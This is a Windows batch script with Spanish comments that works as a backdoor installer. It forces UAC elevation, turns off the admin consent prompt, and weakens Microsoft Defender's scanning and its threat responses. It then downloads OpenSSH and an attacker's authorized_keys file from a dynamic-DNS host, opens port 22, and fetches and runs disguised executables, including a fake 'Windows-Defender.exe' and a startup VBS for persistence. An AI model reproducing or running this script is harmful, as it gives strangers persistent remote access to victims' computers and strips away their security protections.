@echo off 
:-------------------------------------
@echo off 
REM  --> Analizando los permisos
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

@echo off 
if '%errorlevel%' NEQ '0' (
@echo off 
goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------  
::/Pro
PowerShell Set-ExecutionPolicy RemoteSigned -Force
PowerShell Set-ExecutionPolicy Unrestricted -Force
PowerShell Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value "0" 
PowerShell Set-MpPreference -DisableBehaviorMonitoring $true -Force
PowerShell Set-MpPreference -DisableBlockAtFirstSeen $true -Force
PowerShell Set-MpPreference -DisableIOAVProtection $true -Force 
PowerShell Set-MpPreference -DisableScriptScanning $true -Force
PowerShell Set-MpPreference -HighThreatDefaultAction 6 -Force
PowerShell Set-MpPreference -ModerateThreatDefaultAction 6 -Force
PowerShell Set-MpPreference -LowThreatDefaultAction 6 -Force
PowerShell Set-MpPreference -SevereThreatDefaultAction 6 -Force
PowerShell New-Item -Path c:\ -Name temp -ItemType Directory
PowerShell (New-Object System.Net.WebClient).DownloadFile('http://fenixfilmes.ddns.net:8000/OpenSSH-Win64.zip','C:\temp\OpenSSH-Win64.zip')
PowerShell Expand-Archive -Path "c:\temp\OpenSSH-Win64.Zip" -DestinationPath "C:\ProgramData\OpenSSH"
PowerShell . "C:\ProgramData\OpenSSH\OpenSSH-Win64\install-sshd.ps1"
PowerShell New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
PowerShell Set-Service sshd -StartupType Automatic
PowerShell New-item -Path $env:USERPROFILE -Name .ssh -ItemType Directory -force
PowerShell (New-Object System.Net.WebClient).DownloadFile('http://fenixfilmes.ddns.net:8000/.ssh/authorized_keys','C:\%HoMePath%\.ssh\authorized_keys')
PowerShell (New-Object System.Net.WebClient).DownloadFile('http://fenixfilmes.ddns.net:8000/Windows-Defender.exe','C:\%HoMePath%\AppData\Roaming\Microsoft\Windows\Windows-Defender.exe')
PowerShell (New-Object System.Net.WebClient).DownloadFile('http://fenixfilmes.ddns.net:8000/dumpID.exe','C:\%HoMePath%\AppData\Roaming\Microsoft\Windows\dumpID.exe')
PowerShell (New-Object System.Net.WebClient).DownloadFile('http://fenixfilmes.ddns.net:8000/WindowsSecurityDefender.vbs','C:\%HoMePath%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurityDefender.vbs')
PowerShell (New-Object System.Net.WebClient).DownloadFile('http://fenixfilmes.ddns.net:8000/run.vbs','C:\%HoMePath%\AppData\Roaming\Microsoft\Windows\run.vbs')
PowerShell Start-Service sshd
C:\%HoMePath%\AppData\Roaming\Microsoft\Windows\run.vbs
attrib -h -s -r C:\%HoMePath%\.ngrok2
attrib -h -s -r C:\%HoMePath%\.ssh
EXIT







                   





